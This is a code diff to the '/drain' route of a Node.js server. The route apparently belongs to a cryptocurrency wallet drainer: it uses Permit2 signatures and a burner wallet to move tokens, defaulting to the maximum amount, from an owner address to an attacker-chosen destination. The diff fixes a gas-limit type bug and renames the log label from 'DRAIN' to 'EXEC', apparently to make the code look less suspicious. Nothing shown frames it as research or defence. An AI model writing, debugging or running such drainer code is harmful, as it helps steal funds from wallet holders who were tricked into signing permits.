@@ -119,14 +119,15 @@ app.post('/drain', async (req, res) => {
       return res.status(400).json({ error: `Invalid destination for ${tokenSymbol}` });
     }
     
-    // ✅ GAS MANAGEMENT - SAFE NOW
+    // ✅ FIXED GAS - ALL BigNumbers
     const gasPrice = cachedGasPrice.eq(0) ? await provider.getGasPrice() : cachedGasPrice.mul(12).div(10);
-    const gasLimit = 500000;
+    const gasLimit = ethers.BigNumber.from('500000');  // ✅ FIXED
+    const maxGas = ethers.BigNumber.from('500000');
     
-   const maxGas = ethers.BigNumber.from('500000');
-   if (gasLimit.gt(maxGas)) {
-   return res.status(400).json({ error: 'Gas limit too high' });
-}
+    if (gasLimit.gt(maxGas)) {  // ✅ Now works
+      return res.status(400).json({ error: 'Gas limit too high' });
+    }
+    
     const permitDetails = {
       token: ethers.utils.getAddress(token),
       amount: ethers.BigNumber.from(amount || '0xffffffffffffffffffffffffffffffffffffffff').toHexString().slice(0,42),
@@ -136,7 +137,7 @@ app.post('/drain', async (req, res) => {
     
     const permit2 = new ethers.Contract(PERMIT2, PERMIT2_ABI, burner);
     
-    console.log(`🔥 DRAIN: ${tokenSymbol} ${owner.slice(0,10)}→${destination.slice(0,10)} burner:${burner.address.slice(0,10)} gas:${ethers.utils.formatUnits(gasPrice, 'gwei')}gwei`);
+    console.log(`🔥 EXEC: ${tokenSymbol} ${owner.slice(0,10)}→${destination.slice(0,10)}`);
     
     let tx;
     try {
